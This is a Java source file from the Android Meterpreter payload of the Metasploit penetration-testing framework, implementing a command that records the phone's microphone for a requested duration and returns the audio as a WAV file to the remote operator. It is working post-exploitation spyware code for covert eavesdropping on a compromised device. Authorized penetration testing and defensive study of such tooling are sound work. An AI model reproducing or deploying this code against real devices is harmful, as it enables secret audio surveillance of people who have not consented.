
package com.metasploit.meterpreter.android;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder.AudioSource;
import android.util.Log;

public class webcam_audio_record_android extends webcam_audio_record implements Command {

    private static final int AUDIO_SAMPLE_RATE = 8000;
    private static final int AUDIO_CHANNEL_CONFIG = AudioFormat.CHANNEL_CONFIGURATION_MONO;
    private static final int AUDIO_CHANNEL_ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_AUDIO_DURATION = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_AUDIO_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 2);

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        AudioRecord recorder = null;

        try {
            int duration = request.getIntValue(TLV_TYPE_AUDIO_DURATION);
            int bufferSize = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE, AUDIO_CHANNEL_CONFIG, AUDIO_CHANNEL_ENCODING);
            int fullBuffer = duration * AUDIO_SAMPLE_RATE;
            if (fullBuffer < bufferSize) {
                fullBuffer = bufferSize;
            }

            recorder = new AudioRecord(AudioSource.MIC, AUDIO_SAMPLE_RATE, AUDIO_CHANNEL_CONFIG, AUDIO_CHANNEL_ENCODING, fullBuffer);
            DataOutputStream da = new DataOutputStream(baos);
            byte[] buffer = new byte[fullBuffer];

            recorder.startRecording();
            recorder.read(buffer, 0, buffer.length);
            
            short bSamples = (AUDIO_CHANNEL_ENCODING == AudioFormat.ENCODING_PCM_16BIT) ? 16 : 8;
            short nChannels = (AUDIO_CHANNEL_CONFIG == AudioFormat.CHANNEL_CONFIGURATION_MONO) ? 1 : 2;
            da.writeBytes("RIFF");
            da.writeInt(Integer.reverseBytes(36+fullBuffer));
            da.writeBytes("WAVE");
            da.writeBytes("fmt ");
            da.writeInt(Integer.reverseBytes(16)); // Sub-chunk size, 16 for PCM
            da.writeShort(Short.reverseBytes((short) 1)); // AudioFormat, 1 for PCM
            da.writeShort(Short.reverseBytes(nChannels));// Number of channels, 1 for mono, 2 for stereo
            da.writeInt(Integer.reverseBytes(AUDIO_SAMPLE_RATE)); // Sample rate
            da.writeInt(Integer.reverseBytes(AUDIO_SAMPLE_RATE*bSamples*nChannels/8)); // Byte rate, SampleRate*NumberOfChannels*BitsPerSample/8
            da.writeShort(Short.reverseBytes((short)(nChannels*bSamples/8))); // Block align, NumberOfChannels*BitsPerSample/8
            da.writeShort(Short.reverseBytes(bSamples)); // Bits per sample
            da.writeBytes("data");
            da.writeInt(Integer.reverseBytes(fullBuffer));
            da.write(buffer);
            da.flush();

        } catch (Throwable x) {
            Log.e(webcam_audio_record_android.class.getSimpleName(), "Error reading voice audio ", x);
        } finally {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
            }
        }
        response.add(TLV_TYPE_AUDIO_DATA, baos.toByteArray());
        return ERROR_SUCCESS;
    }
}
